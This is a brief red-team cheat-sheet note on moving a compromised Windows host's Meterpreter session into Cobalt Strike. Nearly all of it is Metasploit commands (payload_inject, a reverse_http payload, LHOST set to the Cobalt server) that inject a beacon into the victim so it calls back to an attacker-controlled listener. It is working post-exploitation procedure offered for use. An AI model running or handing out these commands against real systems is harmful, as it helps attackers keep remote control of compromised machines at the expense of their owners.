Cobalt Strike

Move a meterpreter / metasploit session to Cobalt

```
in Cobalt
windows/beacon_http/reverse_http

in Metasploit
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set LHOST [IP of compromised system or cobalt IP]
set LPORT 80
set session 1
set DisablePayloadHandler true
exploit (-j)
```



